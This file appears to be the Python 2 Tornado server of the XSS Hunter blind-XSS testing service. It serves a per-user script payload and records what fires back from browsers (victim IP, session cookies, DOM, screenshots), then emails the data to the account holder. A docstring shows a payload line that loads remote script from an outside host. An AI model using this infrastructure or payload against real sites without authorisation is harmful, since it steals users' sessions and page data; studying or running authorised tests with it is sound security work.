#!/usr/bin/env python
import tornado.template
import logging.handlers
import tornado.options
import tornado.ioloop
import dns.resolver
import tornado.web
import logging
import binascii
import unirest
import urllib
import copy
import json
import time
import yaml
import sys
import os
import io

from models.initiate_database import *
from tornado import gen
from tornado import httpclient
from models.user import User
from models.injection_record import Injection
from models.request_record import InjectionRequest
from models.collected_page import CollectedPage
from binascii import a2b_base64

logging.basicConfig(filename="logs/detailed.log",level=logging.DEBUG)

try:
    with open( '../config.yaml', 'r' ) as f:
        settings = yaml.safe_load( f )
except IOError:
    print "Error reading config.yaml, have you created one? (Hint: Try running ./generate_config.py)"
    exit()

CSRF_EXEMPT_ENDPOINTS = [ "/api/contactus", "/api/register", "/", "/api/login", "/health", "/favicon.ico", "/page_callback", "/api/record_injection" ]
FORBIDDEN_SUBDOMAINS = [ "www", "api" ]

with open( "probe.js", "r" ) as probe_handler:
    probejs = probe_handler.read()

class BaseHandler(tornado.web.RequestHandler):
    def __init__(self, *args, **kwargs):
        super(BaseHandler, self).__init__(*args, **kwargs)

        if self.request.uri.startswith( "/api/" ):
            self.set_header("Content-Type", "application/json")
        else:
            self.set_header("Content-Type", "application/javascript")

        self.set_header("X-Frame-Options", "deny")
        self.set_header("Content-Security-Policy", "default-src 'self'")
        self.set_header("X-XSS-Protection", "1; mode=block")
        self.set_header("X-Content-Type-Options", "nosniff")
        self.set_header("Access-Control-Allow-Headers", "X-CSRF-Token, Content-Type")
        self.set_header("Access-Control-Allow-Origin", "https://www." + settings["domain"])
        self.set_header("Access-Control-Allow-Methods", "OPTIONS, PUT, DELETE, POST, GET")
        self.set_header("Access-Control-Allow-Credentials", "true")
        self.set_header("Cache-Control", "no-cache, no-store, must-revalidate")
        self.set_header("Pragma", "no-cache")
        self.set_header("Expires", "0")

        self.request.remote_ip = self.request.headers.get( "X-Forwarded-For" )

        if not self.validate_csrf_token() and self.request.uri not in CSRF_EXEMPT_ENDPOINTS and not self.request.uri.startswith( "/b" ):
            self.error( "Invalid CSRF token provided!" )
            self.logit( "Someone did a request with an invalid CSRF token!", "warn")
            self.finish()
            return

    def logit( self, message, message_type="info" ):
        user_id = self.get_secure_cookie( "user" )
        if user_id != None:
            user = session.query( User ).filter_by( id=user_id ).first()
            if user != None:
                message = "[" + user.username + "]" + message

        message = "[" + self.request.remote_ip + "] " + message

        if message_type == "info":
            logging.info( message )
        elif message_type == "warn":
            logging.warn( message )
        elif message_type == "debug":
            logging.debug( message )
        else:
            logging.info( message )

    def options(self):
        pass

    # Hack to stop Tornado from sending the Etag header
    def compute_etag( self ):
        return None

    def throw_404( self ):
        self.set_status(404)
        self.write("Resource not found")

    def on_finish( self ):
        session.close()

    def validate_csrf_token( self ):
        csrf_token = self.get_secure_cookie( "csrf" )

        if csrf_token == None:
            return True

        if self.request.headers.get( 'X-CSRF-Token' ) == csrf_token:
            return True

        if self.get_argument( 'csrf', False ) == csrf_token:
            return True

        return False

    def validate_input( self, required_field_list, input_dict ):
        for field in required_field_list:
            if field not in input_dict:
                self.error( "Missing required field '" + field + "', this endpoint requires the following parameters: " + ', '.join( required_field_list ) )
                return False
            if input_dict[ field ] == "":
                self.error( "Missing required field '" + field + "', this endpoint requires the following parameters: " + ', '.join( required_field_list ) )
                return False
        return True

    def error( self, error_message ):
        self.write(json.dumps({
            "success": False,
            "error": error_message
        }))

    def get_authenticated_user( self ):
        user_id = self.get_secure_cookie( "user" )
        if user_id == None:
            self.error( "You must be authenticated to perform this action!" )
        return session.query( User ).filter_by( id=user_id ).first()

    def get_user_from_subdomain( self ):
        domain = self.request.headers.get( 'Host' )
        domain_parts = domain.split( "." + settings["domain"] )
        subdomain = domain_parts[0]
        return session.query( User ).filter_by( domain=subdomain ).first()

def data_uri_to_file( data_uri ):
    """
    Turns the canvas data URI into a file handler
    """
    raw_base64 = data_uri.replace( 'data:image/png;base64,', '' )
    binary_data = a2b_base64( raw_base64 )
    f = io.BytesIO( binary_data )
    return f

def pprint( input_dict ):
    print json.dumps(input_dict, sort_keys=True, indent=4, separators=(',', ': '))

class GetXSSPayloadFiresHandler(BaseHandler):
    """
    Endpoint for querying for XSS payload fire data.

    By default returns past 25 payload fires

    Params:
        offset
        limit
    """
    def get( self ):
        self.logit( "User retrieved their injection results" )
        user = self.get_authenticated_user()
        offset = abs( int( self.get_argument('offset', default=0 ) ) )
        limit = abs( int( self.get_argument('limit', default=25 ) ) )
        results = session.query( Injection ).filter_by( owner_id = user.id ).order_by( Injection.injection_timestamp.desc() ).limit( limit ).offset( offset )
        total = session.query( Injection ).filter_by( owner_id = user.id ).count()

        return_list = []

        for result in results:
            return_list.append( result.get_injection_blob() )

        return_dict = {
            "results": return_list,
            "total": total,
            "success": True
        }
        self.write( json.dumps( return_dict ) )

def upload_screenshot( base64_screenshot_data_uri ):
    screenshot_filename = "uploads/xsshunter_screenshot_" + binascii.hexlify( os.urandom( 100 ) ) + ".png"
    screenshot_file_handler = data_uri_to_file( base64_screenshot_data_uri )
    local_file_handler = open( screenshot_filename, "w" ) # Async IO http://stackoverflow.com/a/13644499/1195812
    local_file_handler.write( screenshot_file_handler.read() )
    local_file_handler.close()
    return screenshot_filename

def record_callback_in_database( callback_data, request_handler ):
    if len(callback_data["screenshot"]) > 0:
        screenshot_file_path = upload_screenshot( callback_data["screenshot"] )
    else:
        screenshot_file_path = ''

    injection = Injection( vulnerable_page=callback_data["uri"].encode("utf-8"),
        vulnerable_domain=callback_data["domain"].encode("utf-8"),
        document_body=callback_data["document-body"],
        victim_ip=callback_data["ip"].encode("utf-8"),
        referer=callback_data["referrer"].encode("utf-8"),
        user_agent=callback_data["user-agent"].encode("utf-8"),
        cookies=callback_data["cookies"].encode("utf-8"),
        dom=callback_data["dom"].encode("utf-8"),
        origin=callback_data["origin"].encode("utf-8"),
        screenshot=screenshot_file_path.encode("utf-8"),
        injection_timestamp=int(time.time()),
        browser_time=int(callback_data["browser-time"])
    )
    injection.generate_injection_id()
    owner_user = request_handler.get_user_from_subdomain()
    injection.owner_id = owner_user.id

    # Check if this is correlated to someone's request.
    if callback_data["injection_key"] != "[PROBE_ID]":
        correlated_request_entry = session.query( InjectionRequest ).filter_by( injection_key=callback_data["injection_key"] ).filter_by( owner_correlation_key=owner_user.owner_correlation_key ).first()

        if correlated_request_entry != None:
            injection.correlated_request = correlated_request_entry.request
    else:
        injection.correlated_request = "Could not correlate XSS payload fire with request!"

    session.add( injection )
    session.commit()

    return injection

def email_sent_callback( response ):
    print response.body

def send_email( to, subject, body, attachment_file, body_type="html" ):
    if body_type == "html":
        body += "<br /><img src=\"https://api." + settings["domain"] + "/" + attachment_file.encode( "utf-8" ) + "\" />" # I'm so sorry.

    email_data = {
        "from": urllib.quote_plus( settings["email_from"] ),
        "to": urllib.quote_plus( to ),
        "subject": urllib.quote_plus( subject ),
        body_type: urllib.quote_plus( body ),
    }

    thread = unirest.post( "https://api.mailgun.net/v3/" + settings["mailgun_sending_domain"] + "/messages",
            headers={"Accept": "application/json"},
            params=email_data,
            auth=("api", settings["mailgun_api_key"] ),
            callback=email_sent_callback)

def send_javascript_pgp_encrypted_callback_message( email_data, email ):
    return send_email( email, "[XSS Hunter] XSS Payload Message (PGP Encrypted)", email_data, False, "text" )

def send_javascript_callback_message( email, injection_db_record ):
    loader = tornado.template.Loader( "templates/" )

    injection_data = injection_db_record.get_injection_blob()

    email_html = loader.load( "xss_email_template.htm" ).generate( injection_data=injection_data, domain=settings["domain"] )
    return send_email( email, "[XSS Hunter] XSS Payload Fired On " + injection_data['vulnerable_page'], email_html, injection_db_record.screenshot )

class UserInformationHandler(BaseHandler):
    def get(self):
        user = self.get_authenticated_user()
        self.logit( "User grabbed their profile information" )
        if user == None:
            return
        self.write( json.dumps( user.get_user_blob() ) )

    def put(self):
        user = self.get_authenticated_user()
        if user == None:
            return

        user_data = json.loads(self.request.body)

        # Mass assignment is dangerous mmk
        allowed_attributes = ["pgp_key", "full_name", "email", "password", "email_enabled", "chainload_uri", "page_collection_paths_list" ]
        invalid_attribute_list = []
        tmp_domain = user.domain
        for key, value in user_data.iteritems():
            if key in allowed_attributes:
                return_data = user.set_attribute( key, user_data.get( key ) )
                if return_data != True:
                    invalid_attribute_list.append( key )

        session.commit()

        return_data = user.get_user_blob()

        if invalid_attribute_list:
            return_data["success"] = False
            return_data["invalid_fields"] = invalid_attribute_list
        else:
            self.logit( "User just updated their profile information." )
            return_data["success"] = True

        self.write( json.dumps( return_data ) )

def authenticate_user( request_handler, in_username ):
    user = session.query( User ).filter_by( username=in_username ).first()

    csrf_token = binascii.hexlify( os.urandom( 50 ) )
    request_handler.set_secure_cookie( "user", user.id, httponly=True )
    request_handler.set_secure_cookie( "csrf", csrf_token, httponly=True )
    request_handler.write(json.dumps({
        "success": True,
        "csrf_token": csrf_token,
    }))

class RegisterHandler(BaseHandler):
    @gen.coroutine
    def post(self):
        user_data = json.loads(self.request.body)
        user_data["email_enabled"] = True
        if not self.validate_input( ["email","username","password", "domain"], user_data ):
            return

        if session.query( User ).filter_by( username=user_data.get( "username" ) ).first():
            return_dict = {
                "success": False,
                "invalid_fields": ["username (already registered!)"],
            }
            self.write( json.dumps( return_dict ) )
            return

	domain = user_data.get( "domain" )
        if session.query( User ).filter_by( domain=domain ).first() or domain in FORBIDDEN_SUBDOMAINS:
            return_dict = {
                "success": False,
                "invalid_fields": ["domain (already registered!)"],
            }
            self.write( json.dumps( return_dict ) )
            return

        new_user = User()

        return_dict = {}
        allowed_attributes = ["pgp_key", "full_name", "domain", "email", "password", "username", "email_enabled" ]
        invalid_attribute_list = []
        for key, value in user_data.iteritems():
            if key in allowed_attributes:
                return_data = new_user.set_attribute( key, user_data.get( key ) )
                if return_data != True:
                    invalid_attribute_list.append( key )

        new_user.generate_user_id()

        if invalid_attribute_list:
            return_dict["success"] = False
            return_dict["invalid_fields"] = invalid_attribute_list
            return_dict = {
                "success": False,
                "invalid_fields": ["username (already registered!)"],
            }
            self.write( json.dumps( return_dict ) )
            return

        self.logit( "New user successfully registered with username of " + user_data["username"] )
        session.add( new_user )
        session.commit()

        authenticate_user( self, user_data.get( "username" ) )
        return

class LoginHandler(BaseHandler):
    @gen.coroutine
    def post(self):
        user_data = json.loads(self.request.body)
        if not self.validate_input( ["username","password"], user_data ):
            return

        user = session.query( User ).filter_by( username=user_data.get( "username" ) ).first()

        if user is None:
            self.error( "Invalid username or password supplied" )
            self.logit( "Someone failed to log in as " + user_data["username"], "warn" )
            return
        elif user.compare_password( user_data.get( "password" ) ):
            authenticate_user( self, user_data.get( "username" ) )
            self.logit( "Someone logged in as " + user_data["username"] )
            return
        self.error( "Invalid username or password supplied" )
        return

class CallbackHandler(BaseHandler):
    """
    This is the handler that receives the XSS payload data upon it firing in someone's browser, it contains things such as session cookies, the page DOM, a screenshot of the page, etc.
    """

    def post( self ):
        self.set_header( 'Access-Control-Allow-Origin', '*' )
        self.set_header( 'Access-Control-Allow-Methods', 'POST, GET, HEAD, OPTIONS' )
        self.set_header( 'Access-Control-Allow-Headers', 'X-Requested-With' )

        owner_user = self.get_user_from_subdomain()

        if owner_user == None:
            self.throw_404()
            return

        if "-----BEGIN PGP MESSAGE-----" in self.request.body:
            if owner_user.email_enabled:
                self.logit( "User " + owner_user.username + " just got a PGP encrypted XSS callback, passing it along." )
                send_javascript_pgp_encrypted_callback_message( self.request.body, owner_user.email )
        else:
            callback_data = json.loads( self.request.body )
            callback_data['ip'] = self.request.remote_ip

	    # Check if injection already recently recorded
	    owner_user = self.get_user_from_subdomain()
    	    if 0 < session.query( InjectionRequest ).filter( Injection.owner_id == owner_user.id, Injection.vulnerable_page == callback_data["uri"].encode("utf-8"), Injection.victim_ip == self.request.remote_ip, Injection.user_agent == callback_data["user-agent"].encode("utf-8"), Injection.injection_timestamp > time.time()-900).count():
                self.write( '{"DUPLICATE"}' )
            else:
                injection_db_record = record_callback_in_database( callback_data, self )
                self.logit( "User " + owner_user.username + " just got an XSS callback for URI " + injection_db_record.vulnerable_page )

                if owner_user.email_enabled:
                    send_javascript_callback_message( owner_user.email, injection_db_record )
                self.write( '{}' )

class HomepageHandler(BaseHandler):
    def get(self, path):

        self.set_header("Access-Control-Allow-Origin", "*")
        self.set_header("Access-Control-Allow-Methods", "OPTIONS, PUT, DELETE, POST, GET")
        self.set_header("Access-Control-Allow-Headers", "X-Requested-With, Content-Type, Origin, Authorization, Accept, Accept-Encoding")

        domain = self.request.headers.get( 'Host' )

        user = self.get_user_from_subdomain()

        if user == None:
            self.throw_404()
            return

        new_probe = probejs
        new_probe = new_probe.replace( '[HOST_URL]', "https://" + domain )
        new_probe = new_probe.replace( '[PGP_REPLACE_ME]', json.dumps( user.pgp_key ) )
        new_probe = new_probe.replace( '[CHAINLOAD_REPLACE_ME]', json.dumps( user.chainload_uri ) )
        new_probe = new_probe.replace( '[COLLECT_PAGE_LIST_REPLACE_ME]', json.dumps( user.get_page_collection_path_list() ) )

        if user.pgp_key != "":
            with open( "templates/pgp_encrypted_template.txt", "r" ) as template_handler:
                new_probe = new_probe.replace( '[TEMPLATE_REPLACE_ME]', json.dumps( template_handler.read() ))
        else:
            new_probe = new_probe.replace( '[TEMPLATE_REPLACE_ME]', json.dumps( "" ))

	# Check recent callbacks
	if "Referer" in self.request.headers:
            if 0 < session.query( Injection ).filter( Injection.victim_ip == self.request.remote_ip, Injection.injection_timestamp > time.time()-900, Injection.vulnerable_page == self.request.headers.get("Referer")).count():
                new_probe = 'Injection already recorded within last fifteen minutes'
	else:
	    if 0 < session.query( Injection ).filter( Injection.victim_ip == self.request.remote_ip, Injection.injection_timestamp > time.time()-900).count():
                new_probe = 'Injection already recorded within last fifteen minutes'

        if self.request.uri != "/":
            probe_id = self.request.uri.split('/')[1].split('?')[0]
            self.write( new_probe.replace( "[PROBE_ID]", probe_id ) )
        else:
            self.write( new_probe )

class ContactUsHandler(BaseHandler):
    def post( self ):
        contact_data = json.loads(self.request.body)
        if not self.validate_input( ["name","email", "body"], contact_data ):
            return

        self.logit( "Someone just used the 'Contact Us' form." )

        email_body = "Name: " + contact_data["name"] + "\n"
        email_body += "Email: " + contact_data["email"] + "\n"
        email_body += "Message: " + contact_data["body"] + "\n"
        send_email( settings["abuse_email"], "XSSHunter Contact Form Submission", email_body, "", "text" )

        self.write({
            "success": True,
        })

class ResendInjectionEmailHandler(BaseHandler):
    def post( self ):
        post_data = json.loads(self.request.body)

        if not self.validate_input( ["id"], post_data ):
            return

        injection_db_record = session.query( Injection ).filter_by( id=str( post_data.get( "id" ) ) ).first()
        user = self.get_authenticated_user()

        if injection_db_record.owner_id != user.id:
            self.logit( "Just tried to resend an injection email that wasn't theirs! (ID:" + post_data["id"] + ")", "warn")
            self.error( "Fuck off <3" )
            return

        self.logit( "User just requested to resend the injection record email for URI " + injection_db_record.vulnerable_page )

        send_javascript_callback_message( user.email, injection_db_record )

        self.write({
            "success": True,
            "message": "Email sent!",
        })

class DeleteInjectionHandler(BaseHandler):
    def delete( self ):
        delete_data = json.loads(self.request.body)

        if not self.validate_input( ["id"], delete_data ):
            return

        injection_db_record = session.query( Injection ).filter_by( id=str( delete_data.get( "id" ) ) ).first()
        user = self.get_authenticated_user()

        if injection_db_record.owner_id != user.id:
            self.logit( "Just tried to delete an injection email that wasn't theirs! (ID:" + delete_data["id"] + ")", "warn")
            self.error( "Fuck off <3" )
            return

        self.logit( "User delted injection record with an id of " + injection_db_record.id + "(" + injection_db_record.vulnerable_page + ")")

	try:
            os.remove( injection_db_record.screenshot )
	except OSError as e:
            self.logit("Screenshot doesn't exist - " + injection_db_record.screenshot)
            pass

        injection_db_record = session.query( Injection ).filter_by( id=str( delete_data.get( "id" ) ) ).delete()
        session.commit()

        self.write({
            "success": True,
            "message": "Injection deleted!",
        })

class HealthHandler(BaseHandler):
    def get( self ):
        try:
            injection_db_record = session.query( Injection ).filter_by( id="test" ).limit( 1 )
            self.write( "XSSHUNTER_OK" )
        except:
            self.write( "ERROR" )
            self.set_status(500)

class LogoutHandler( BaseHandler ):
    def get( self ):
        self.logit( "User is logging out." )
        self.clear_cookie("user")
        self.clear_cookie("csrf")
        self.write( "{}" )

class InjectionRequestHandler( BaseHandler ):
    """
    This endpoint is for recording injection attempts.

    It requires the following parameters:

    request - This is the request (note: NOT specific to HTTP) which was performed to attempt the injection.
    owner_correlation_key - This is a private key which is used to link the injection to a specific user - displayed in the settings panel.
    injection_key - This is the injection key which the XSS payload uses to identify itself to the XSS Hunter service ( <script src=//x.xss.ht/aiwlq></script> where aiwlq is the key )

    Sending two correlation requests means that the previous injection_key entry will be replaced.
    """
    def post( self ):
        return_data = {}
        request_dict = json.loads( self.request.body.replace('\r', '\\n') )
        if not self.validate_input( ["request", "owner_correlation_key", "injection_key"], request_dict ):
            return

        injection_key = request_dict.get( "injection_key" )

        injection_request = InjectionRequest()
        injection_request.injection_key = injection_key
        injection_request.request = request_dict.get( "request" )
        owner_correlation_key = request_dict.get( "owner_correlation_key" )
        injection_request.owner_correlation_key = owner_correlation_key

        # Ensure that this is an existing correlation key
        owner_user = session.query( User ).filter_by( owner_correlation_key=owner_correlation_key ).first()
        if owner_user is None:
            return_data["success"] = False
            return_data["message"] = "Invalid owner correlation key provided!"
            self.write( json.dumps( return_data ) )
            return

        self.logit( "User " + owner_user.username + " just sent us an injection attempt with an ID of " + injection_request.injection_key )

        # Replace any previous injections with the same key and owner
        session.query( InjectionRequest ).filter_by( injection_key=injection_key ).filter_by( owner_correlation_key=owner_correlation_key ).delete()

        return_data["success"] = True
        return_data["message"] = "Injection request successfully recorded!"
        session.add( injection_request )
        session.commit()
        self.write( json.dumps( return_data ) )

class CollectPageHandler( BaseHandler ):
    def post( self ):
        self.set_header( 'Access-Control-Allow-Origin', '*' )
        self.set_header( 'Access-Control-Allow-Methods', 'POST, GET, HEAD, OPTIONS' )
        self.set_header( 'Access-Control-Allow-Headers', 'X-Requested-With' )

        user = self.get_user_from_subdomain()
        request_dict = json.loads( self.request.body )
        if not self.validate_input( ["page_html", "uri"], request_dict ):
            return

        if user == None:
            self.throw_404()
            return

        page = CollectedPage()
        page.uri = request_dict.get( "uri" )
        page.page_html = request_dict.get( "page_html" )
        page.owner_id = user.id
        page.timestamp = int(time.time())

        self.logit( "Received a collected page for user " + user.username + " with a URI of " + page.uri )

        session.add( page )
        session.commit()

class GetCollectedPagesHandler( BaseHandler ):
    """
    Endpoint for querying for collected pages.

    By default returns past 25 payload fires

    Params:
        offset
        limit
    """
    def get( self ):
        user = self.get_authenticated_user()
        offset = abs( int( self.get_argument('offset', default=0 ) ) )
        limit = abs( int( self.get_argument('limit', default=25 ) ) )
        results = session.query( CollectedPage ).filter_by( owner_id = user.id ).order_by( CollectedPage.timestamp.desc() ).limit( limit ).offset( offset )
        total = session.query( CollectedPage ).filter_by( owner_id = user.id ).count()

        self.logit( "User is retrieving collected pages.")

        return_list = []

        for result in results:
            return_list.append( result.to_dict() )

        return_dict = {
            "results": return_list,
            "total": total,
            "success": True
        }
        self.write( json.dumps( return_dict ) )

class DeleteCollectedPageHandler(BaseHandler):
    def delete( self ):
        delete_data = json.loads(self.request.body)

        if not self.validate_input( ["id"], delete_data ):
            return

        collected_page_db_record = session.query( CollectedPage ).filter_by( id=str( delete_data.get( "id" ) ) ).first()
        user = self.get_authenticated_user()

        if collected_page_db_record.owner_id != user.id:
            self.logit( "Just tried to delete a collected page that wasn't theirs! (ID:" + delete_data["id"] + ")", "warn")
            self.error( "Fuck off <3" )
            return

        self.logit( "User is deleting collected page with the URI of " + collected_page_db_record.uri )
        collected_page_db_record = session.query( CollectedPage ).filter_by( id=str( delete_data.get( "id" ) ) ).delete()
        session.commit()

        self.write({
            "success": True,
            "message": "Collected page deleted!",
        })

def make_app():
    return tornado.web.Application([
        (r"/api/register", RegisterHandler),
        (r"/api/login", LoginHandler),
        (r"/api/collected_pages", GetCollectedPagesHandler),
        (r"/api/delete_injection", DeleteInjectionHandler),
        (r"/api/delete_collected_page", DeleteCollectedPageHandler),
        (r"/api/user", UserInformationHandler),
        (r"/api/payloadfires", GetXSSPayloadFiresHandler),
        (r"/api/contactus", ContactUsHandler),
        (r"/api/resend_injection_email", ResendInjectionEmailHandler),
        (r"/api/logout", LogoutHandler),
        (r"/js_callback", CallbackHandler),
        (r"/page_callback", CollectPageHandler),
        (r"/health", HealthHandler),
        (r"/uploads/(.*)", tornado.web.StaticFileHandler, {"path": "uploads/"}),
        (r"/api/record_injection", InjectionRequestHandler),
        (r"/(.*)", HomepageHandler),
    ], cookie_secret=settings["cookie_secret"])

if __name__ == "__main__":
    args = sys.argv
    args.append("--log_file_prefix=logs/access.log")
    tornado.options.parse_command_line(args)
    Base.metadata.create_all(engine)
    app = make_app()
    app.listen( 8888 )
    tornado.ioloop.IOLoop.current().start()
